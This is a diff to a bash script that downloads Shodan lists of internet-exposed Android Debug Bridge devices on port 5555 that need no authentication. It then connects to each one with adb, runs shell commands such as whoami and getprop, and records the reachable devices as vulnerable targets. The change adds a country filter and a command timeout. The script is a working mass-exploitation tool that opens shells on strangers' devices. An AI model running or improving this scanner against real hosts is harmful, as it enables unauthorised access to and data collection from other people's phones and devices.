@@ -26,6 +26,7 @@ show_help() {
     echo "  -h, --help          Show this help message and exit"
     echo "  -v, --version       Show script version and exit"
     echo "  -t, --target        Specify a single target instead of test targets from shodan"
+    echo "  -c, --country       Specify country using format ISO 3166-1 alfa-2. Example -c PA for panama"
     echo "  -s, --save          Dont delete result file (vulnerable_targets.txt)"
     echo
     exit 0
@@ -73,6 +74,18 @@ parse_args(){
                     error_exit "Argument for $1 is missing"
                 fi
                 ;;
+            -c|--country)
+                if [[ -n "${2-}" && $2 != -* ]];then
+                    country=( $2 )
+                    if [[ ${#country} -ne 2 ]];then
+                        error_exit "Incorrect format -> $country. Use -h to see a help message"
+                    fi
+                    country=$2
+                    shift
+                else
+                    error_exit "Argument for $1 is missing"
+                fi
+                ;;
             -s|--save)
                 save_file=true
                 ;;
@@ -89,7 +102,11 @@ download_targets(){
     echo "[!] Downloading targets from shodan"
     shodan_file="shodan_result"
     if [[ ! (-e "${shodan_file}.json.gz") ]]; then
-        shodan download ${shodan_file} 'Android Debug Bridge port:5555 !("Authentication is required")' 
+        if [[ -v country ]];then
+            shodan download ${shodan_file} "Android Debug Bridge port:5555 !(\"Authentication is required\") country:$country"
+        else
+            shodan download ${shodan_file} "Android Debug Bridge port:5555 !(\"Authentication is required\")"
+        fi
     fi 
 }
 
@@ -103,12 +120,13 @@ test_single_target() {
         target_city="UNK"
     fi
     
+    
     # Testing that the IP is responding to ping
     if ping -w 3 -c 1 $target_ip &> /dev/null; then
         # Testing that the port 5555 is receiving connections
         if nc -nzv -w 3 $target_ip 5555 &> /dev/null; then
             if [[ -z $(adb connect $target_ip | grep -o "failed") ]]; then
-                if [[ -z $(adb -s $target_ip shell whoami 2>&1 | grep -o -E "(Permission denied|error:|device offline|killed|inaccessible or not found)" ) ]];then
+                if [[ -z $(timeout 5s adb -s $target_ip shell whoami 2>&1 | grep -o -E "(Permission denied|error:|device offline|killed|inaccessible or not found)" ) ]];then
                     echo -e "[\e[31mVULNERABLE\e[0m] (respond to ICMP) (port 5555 is open) (adb connection successful and shell access)"
                     
                     local getprop_output=$( adb -s $target_ip shell getprop )
@@ -167,7 +185,7 @@ main() {
     export -f test_single_target
     parallel --halt soon,fail=1 -j 40 test_single_target ::: "${adb_targets[@]}" || true
     
-    sleep 3
+
 
     # Collect results
     if [[ -f vulnerable_targets.txt ]]; then
